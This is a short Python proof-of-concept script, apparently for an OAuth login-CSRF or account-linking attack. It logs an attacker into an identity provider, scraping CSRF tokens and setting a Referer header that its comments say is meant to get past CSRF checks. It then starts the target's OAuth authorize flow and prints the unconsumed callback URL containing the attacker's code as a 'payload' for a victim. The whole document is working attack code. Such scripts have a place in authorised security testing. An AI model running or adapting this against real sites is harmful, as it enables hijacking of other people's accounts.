import requests
from bs4 import BeautifulSoup

# replace with target urls and attacker credentials
target_base = "<target>"
idp_base = "<idp>"
user = "attacker"
password = "password123"

session = requests.Session()

def fetch_csrf(url):
    # fetches page and extracts common django/rails csrf tokens
    res = session.get(url)
    soup = BeautifulSoup(res.text, 'html.parser')
    for name in ['csrfmiddlewaretoken', 'authenticity_token', '_csrf']:
        token = soup.find('input', dict(name=name))
        if token: return token['value']
    return None

def idp_login():
    # authenticates attacker with the identity provider
    url = f"{idp_base}/accounts/login/" 
    token = fetch_csrf(url)
    if not token: return False

    data = {
        'csrfmiddlewaretoken': token,
        'username': user,
        'password': password
    }
    
    # headers often required to bypass basic csrf checks
    headers = {'Referer': url}
    res = session.post(url, data=data, headers=headers)
    return any(term in res.text for term in ["Log Out", "logout", "Sign out"])

def get_payload():
    # initiates oauth flow to grab the unconsumed callback url
    auth_url = f"{target_base}/accounts/oauth2/authorize/"
    print(f"[*] initiating flow: {auth_url}")
    
    # allow_redirects=true will follow the flow to the code generation
    res = session.get(auth_url, allow_redirects=True)
    
    if "code=" in res.url:
        print(f"[+] payload generated:\n{res.url}")
    else:
        print("[-] failed to capture code. check auth flow or session.")

if __name__ == "__main__":
    if idp_login():
        print("[+] idp login successful")
        get_payload()
    else:
        print("[-] idp login failed")
